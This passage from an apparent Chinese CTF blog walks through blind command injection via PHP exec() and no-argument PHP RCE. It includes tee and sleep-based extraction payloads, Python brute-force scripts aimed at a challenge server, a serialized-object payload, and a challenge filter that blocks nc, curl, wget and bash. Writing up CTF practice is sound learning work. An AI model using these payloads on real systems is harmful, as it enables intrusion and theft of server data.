class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>首先可以看到执行命令的函数是exec()，这个函数并不会将命令执行后的结果回显出来，所以是一个无回显的命令注入，但是这里还ban了很多命令和符号，导致了我们想通过DNSLog和HTTP外带以及反弹shell都无法实现。<br>有写入权限</p>
+<p>在有写入权限的情况下，事情就变得简单了，我们可以利用tee命令</p>
+<p>tee [OPTION]… [FILE]…</p>
+<p>从标准输入读取数据并重定向到标准输出和文件。</p>
+<blockquote>
+<p>example:</p>
+<p>tee file1 file2      &#x2F;&#x2F;将输入的内容覆盖到这两个文件里面<br>ls|tee 1.txt          &#x2F;&#x2F;将ls命令的输出显示并保存到1.txt文件中</p>
+</blockquote>
+<p>我们可以通过这个命令将执行之后的结果写入到文件中，然后再访问这个文件即可。</p>
+<blockquote>
+<p>payload:</p>
+<p>?c&#x3D;ls &#x2F;|tee 1.txt        &#x2F;&#x2F;访问1.txt，发现有f149_15_h3r3文件<br>?c&#x3D;cat &#x2F;f149_15_h3r3|tee 2.txt        &#x2F;&#x2F;再访问2.txt即可<br>没有写入权限</p>
+</blockquote>
+<p>没有写入权限就比较麻烦了，只能通过sleep命令根据执行时间来进行盲注。</p>
+<pre><code>首先我们可以通过sleep命令根据返回的时间来判断是否存在命令执行漏洞。
+</code></pre>
+<p>?c&#x3D;sleep 5</p>
+<p>可以发现网页等待了5秒才返回结果。</p>
+<pre><code>利用shell编程的if判断语句配合awk以及cut命令来获取flag
+awk逐行获取数据
+</code></pre>
+<blockquote>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/# cat flag </span><br><span class="line">  hello</span><br><span class="line">  Flag&#123;success!!&#125;</span><br><span class="line">  root@ubuntu:/# cat flag | awk NR==1</span><br><span class="line">  hello</span><br><span class="line">  root@ubuntu:/# cat flag | awk NR==2</span><br><span class="line">  Flag&#123;success!!&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+</blockquote>
+<pre><code>cut命令逐列获取单个字符
+</code></pre>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/# cat flag | awk NR==2 | cut -c 1</span><br><span class="line"> F</span><br><span class="line"> root@ubuntu:/# cat flag | awk NR==2 | cut -c 2</span><br><span class="line"> l</span><br><span class="line"> root@ubuntu:/# cat flag | awk NR==2 | cut -c 3</span><br><span class="line"> a</span><br></pre></td></tr></table></div></figure>
+
+
+
+<blockquote>
+<p>利用if语句来判断命令是否执行</p>
+</blockquote>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/# if [ $(cat flag | awk NR==2 | cut -c 1) == F ];then echo &quot;right!&quot;;fi</span><br><span class="line">right!</span><br><span class="line">root@ubuntu:/# if [ $(cat flag | awk NR==2 | cut -c 2) == l ];then echo &quot;right!&quot;;fi</span><br><span class="line">right!</span><br><span class="line">root@ubuntu:/# if [ $(cat flag | awk NR==2 | cut -c 1) == F ];then sleep 2;fi</span><br></pre></td></tr></table></div></figure>
+
+
+
+<blockquote>
+<p>用命令ls \查看根目录来获取flag文件名</p>
+</blockquote>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;xxxxx&quot;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">for i in range(1,5):</span><br><span class="line">    for j in range(1,15):</span><br><span class="line">        #ascii码表</span><br><span class="line">        for k in range(32,128):</span><br><span class="line">            k=chr(k)</span><br><span class="line">            payload = &quot;?c=&quot; + f&quot;if [ `ls / | awk NR==&#123;i&#125; | cut -c &#123;j&#125;` == &#123;k&#125; ];then sleep 2;fi&quot;</span><br><span class="line">            try:</span><br><span class="line">                requests.get(url=url+payload, timeout=(1.5,1.5))</span><br><span class="line">            except:</span><br><span class="line">                result = result + k</span><br><span class="line">                print(result)</span><br><span class="line">                break</span><br><span class="line">    result += &quot; &quot;</span><br></pre></td></tr></table></div></figure>
+
+
+
+<blockquote>
+<p>发现一个叫f149_15_h3r3的文件，改以下脚本cat一下</p>
+</blockquote>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;xxxx</span></span><br><span class="line"><span class="string">result = &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">for i in range(1,5):</span></span><br><span class="line"><span class="string">    for j in range(1,60):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       for k in range(32,128):</span></span><br><span class="line"><span class="string">            k=chr(k)</span></span><br><span class="line"><span class="string">            payload = &quot;</span>?c=<span class="string">&quot; + f&quot;</span><span class="keyword">if</span> [ `cat /f149_15_h3r3 | awk NR==&#123;i&#125; | cut -c &#123;j&#125;` == &#123;k&#125; ];then sleep <span class="number">2</span>;fi<span class="string">&quot;</span></span><br><span class="line"><span class="string">            try:</span></span><br><span class="line"><span class="string">              requests.get(url=url+payload, timeout=(1.5,1.5))</span></span><br><span class="line"><span class="string">           except:</span></span><br><span class="line"><span class="string">               result = result + k</span></span><br><span class="line"><span class="string">              print(result)</span></span><br><span class="line"><span class="string">              break</span></span><br><span class="line"><span class="string">  result += &quot;</span> <span class="string">&quot;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>以上是get版本的，最近做了newstar，考了这个知识点</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></div></figure>
+
+<p>脚本：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://fbf7e8e2-509c-4a09-94a5-0b42650ca7a7.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):</span><br><span class="line">        k = <span class="built_in">chr</span>(k)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;payload&#x27;</span>: <span class="string">&#x27;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;N;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:74:&quot;if [ `cat /flag_is_h3eeere | awk NR==1 | cut -c %s` == %s ];then sleep 3;fi&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;&#x27;</span> % (i, k)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(url=url, data=data, timeout=(<span class="number">2</span>, <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = result + k</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            <span class="comment">#需要注意脚本中的i，k的值</span></span><br></pre></td></tr></table></div></figure></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/10/16/%E6%97%A0%E5%8F%82RCE/">无参RCE</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-10-16</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="无参RCE">
+          <a href="#无参RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#无参RCE" class="headerlink" title="无参RCE"></a>无参RCE</h1>
+      
+        <h1 id="0x00前言">
+          <a href="#0x00前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1>
+      <p>刷buu的时候遇到一道题，[GXYCTF2019]禁止套娃，涉及到无参数RCE，但是我不会，记录一下学习过程。<br> <strong>实例</strong></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; </span><br><span class="line">eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">preg_replace(&#x27;/[a-z]+\((?R)?\)/&#x27;, NULL, $code)</span><br><span class="line">pre_match(&#x27;/et|na|nt|strlen|info|path||rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code))</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>解析</strong></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preg_replace 的主要功能就是限制我们传输进来的必须是纯小写字母的函数，而且不能携带参数。</span><br><span class="line">再来看一下：(?R)?，这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）</span><br><span class="line"></span><br><span class="line">preg_match的主要功能就是过滤函数，把一些常用不带参数的函数关键部分都给过滤了，需要去构造别的方法去执行命令。</span><br></pre></td></tr></table></div></figure>
+
+<p>说白了就是传入的参数不能含有参数</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scandir（&#x27;a()&#x27;）//可以使用，里面没有参数</span><br><span class="line">scandir（&#x27;123&#x27;）//不可以使用，里面有参数</span><br></pre></td></tr></table></div></figure>
+
+<p>所谓无参数<code>RCE</code>说白了就是使用一个个的函数来达到我们的目的。<br> 例如<code>print_r(array_reverse(scandir(current(localeconv()))))</code><br> 接下来就说说由哪些方法能完成RCE<br> <strong>测试代码</strong></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h1 id="0x01关于无参数RCE的一些方法">
+          <a href="#0x01关于无参数RCE的一些方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x01关于无参数RCE的一些方法" class="headerlink" title="0x01关于无参数RCE的一些方法"></a>0x01关于无参数RCE的一些方法</h1>
+      
+        <h2 id="方法一-利用session-id">
+          <a href="#方法一-利用session-id" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法一-利用session-id" class="headerlink" title="方法一 利用session_id"></a>方法一 利用session_id</h2>
+      <p>利用<code>http headers</code>传参，然而<code>http</code>中有那么多的内容，最容易想到的估计就是<code>cookies</code>传递参数。<br> 在php中有一个函数<code>session_id</code>可以用来获取&#x2F;设置当前会话ID，并且这个值是我们可控的。但是它的使用有些限制： 文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号 ，但是这并不影响我们操作。我们可以使用十六进制传入，之后使用<code>hex2bin()</code>函数转换即可。但是使用<code>session_id</code>的时候必须要开启<code>session</code>才可以，需要<code>session_start</code><br> 构造payload</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(hex2bin(session_id(session_start())));</span><br><span class="line">hex(&quot;phpinfo();&quot;)=706870696e666f28293b</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154315987.png"></p>
+
+        <h2 id="方法二-利用get-defined-vars-函数">
+          <a href="#方法二-利用get-defined-vars-函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法二-利用get-defined-vars-函数" class="headerlink" title="方法二 利用get_defined_vars ()函数"></a>方法二 利用get_defined_vars ()函数</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars()：返回由所有已定义变量所组成的数组</span><br></pre></td></tr></table></div></figure>
+
+<p>我们通过<code>get</code>或者<code>post</code>方法，传入的参数，以及它的值可以被<code>get_defined_vars()</code>读出来。而且它返回的还是数组，那么我们可以通过php中的一系列对数组操作的函数来得到我们想要的值</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">end() - 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">next() - 将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">prev() - 将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line">reset() - 将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line">each() - 返回当前元素的键名和键值，并将内部指针向前移动。</span><br><span class="line">current() -输出数组中的当前元素的值。</span><br></pre></td></tr></table></div></figure>
+
+<p>构造payload</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(current(get_defined_vars()));&amp;b=phpinfo();</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154330409.png"></p>
+<p>查看最后一个数组，且eval</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(end(current(get_defined_vars())));&amp;b=phpinfo();</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154343786.png"></p>
+
+        <h2 id="方法三-利用getallheaders">
+          <a href="#方法三-利用getallheaders" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法三-利用getallheaders" class="headerlink" title="方法三 利用getallheaders()"></a>方法三 利用getallheaders()</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getallheaders返回当前请求的所有请求头信息</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154359144.png"></p>
+<p>尝试写入phpinfo（）</p>
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154409805.png"></p>
+<p>之后就可用数组操作的函数拿出phpinfo（）且执行。<br> 构造payload</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(next(getallheaders()));</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154420985.png"></p>
+
+        <h2 id="方法四-getenv">
+          <a href="#方法四-getenv" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法四-getenv" class="headerlink" title="方法四 getenv()"></a>方法四 getenv()</h2>
+      <p><code>getenv() ：获取环境变量的值(在PHP7.1之后可以不给予参数)</code><br> 看简介就明白，它并不适用于PHP&lt;7.1的版本，我的版本不合适，报了400错误，往里面传参也不行。</p>
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154438342.png"></p>
+<p>没有成功，好在这种方法使用限制比较多，使用也相对比较少。</p>
+
+        <h2 id="方法五-scandir">
+          <a href="#方法五-scandir" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法五-scandir" class="headerlink" title="方法五 scandir()"></a>方法五 scandir()</h2>
+      <p>这种方法是使用比较多的，相对而言比较多变，各个函数相辅相成。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">scandir()  //函数返回指定目录中的文件和目录的数组。</span><br><span class="line">localeconv()   //返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">current()     //返回数组中的单元，默认取第一个值。</span><br><span class="line">pos是current的别名</span><br><span class="line">getcwd()      //取得当前工作目录</span><br><span class="line">dirname()     //函数返回路径中的目录部分。</span><br><span class="line">array_flip()  //交换数组中的键和值，成功时返回交换后的数组</span><br><span class="line">array_rand()  //从数组中随机取出一个或多个单元</span><br><span class="line">array_flip()和array_rand()配合使用可随机返回当前目录下的文件名</span><br><span class="line">dirname(chdir(dirname()))配合切换文件路径</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>示例</strong></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位</span><br><span class="line">print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));  //查看和读取根目录文件</span><br><span class="line">if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));  //查看和读取根目录文件</span><br></pre></td></tr></table></div></figure>
+
+<p>由此可以看出各个函数相互利用，组合方法有很多</p>
+
+        <h1 id="实例">
+          <a href="#实例" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例" class="headerlink" title="实例"></a>实例</h1>
+      <p>知识不经过组合利用就不会起作用</p>
+
+        <h2 id="GXYCTF2019-禁止套娃">
+          <a href="#GXYCTF2019-禁止套娃" class="heading-link"><i class="fas fa-link"></i></a><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2>
+      <p>dirsearch扫目录得<code>/.git</code> 利用githack得源码</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>查看代码，很明显的无参数RCE<br> 其中<code>(?R)</code>引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数<br> <code>scandir(&#39;.&#39;)</code>返回当前目录，但是如何构造<code>.</code> 函数<code>localeconv()</code> 返回一包含本地数字及货币格式信息的数组。   但是其数组第一项就是<code>.</code>， <code>current()/pos()</code>返回数组中的当前单元, 默认取第一个值。<br> 构造payload</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154457471.png"></p>
+<p>利用对数组操作的函数读取flag<br> 利用<code>array_reverse()</code> 将数组内容反转一下  ， 利用<code>next()</code>指向第二个元素，也就是flag.php</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/AAwangzhan\1\hexoblog\source\image\image-20231013154506994.png"></p>
+
+        <h1 id="0x02-后记">
+          <a href="#0x02-后记" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x02-后记" class="headerlink" title="0x02 后记"></a>0x02 后记</h1>
+      <p>在没学习之前觉得这个知识点可能会很难，现在倒也觉得没有我想的那么难。有些东西做了才知道深浅。继续加油吧。</p>
+<p><strong>参考</strong><br> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/107171940">https://blog.csdn.net/qq_38154820/article/details/107171940</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45570082/article/details/106602261">https://blog.csdn.net/qq_45570082/article/details/106602261</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9360#toc-6">https://xz.aliyun.com/t/9360#toc-6</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/">QLNU22级最后一次校赛wp</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-10-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="校赛wp">
+          <a href="#校赛wp" class="heading-link"><i class="fas fa-link"></i></a><a href="#校赛wp" class="headerlink" title="校赛wp"></a>校赛wp</h1>
+      
+        <h2 id="Crypto">
